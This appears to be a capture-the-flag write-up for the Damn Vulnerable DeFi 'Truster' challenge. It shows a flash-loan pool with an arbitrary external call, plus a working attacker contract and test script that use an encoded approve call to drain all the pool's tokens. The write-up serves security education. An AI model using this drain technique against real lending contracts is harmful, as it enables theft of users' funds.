# Challange #3 - Truster

More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.

## [TrusterLenderPool.sol:](/CTF%20-%20Damn%20Vulnerable/contracts/truster/TrusterLenderPool.sol)

```solidity
function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        damnValuableToken.transfer(borrower, borrowAmount);
        target.functionCall(data);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
```

## [Attacker Contract](/CTF%20-%20Damn%20Vulnerable/contracts/attacker-contracts/AttackerTruster.sol)

```solidity
import "../truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackerTruster {
    TrusterLenderPool public trust; // Make the TrusterLenderPool contract public
    IERC20 public immutable damnValuableToken;

    constructor(address _trust, address tokenAddress) {
        trust = TrusterLenderPool(_trust);
        damnValuableToken = IERC20(tokenAddress);
    }

    function exploit(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external {
        trust.flashLoan(borrowAmount, borrower, target, data);
        // after approving the flash loan, the exploit function will be called
        damnValuableToken.transferFrom(
            address(trust),
            msg.sender,
            1000000 ether
        );
    }
}
```

## [Exploit](/CTF%20-%20Damn%20Vulnerable/test/truster/truster.challenge.js)

```javascript
it("Exploit", async function () {
	const AttackerTrusterDeployer = await ethers.getContractFactory(
		"AttackerTruster",
		attacker
	);
	const AttackContract = await AttackerTrusterDeployer.deploy(
		this.pool.address,
		this.token.address
	);

	const amount = 0;
	const borrower = attacker.address;
	const target = this.token.address;

	// Create abi to approve the attacker to spend all tokens in the pool
	const abi = ["function approve(address spender, uint256 amount)"]; // copied from IERC20.sol
	const interface = new ethers.utils.Interface(abi);
	const data = interface.encodeFunctionData("approve", [
		AttackContract.address,
		TOKENS_IN_POOL,
	]);

	await AttackContract.exploit(amount, borrower, target, data);
});
```

## Explanation

The exploit is very similar to the previous one. The only difference is that we need to approve the attacker to spend all tokens in the pool.
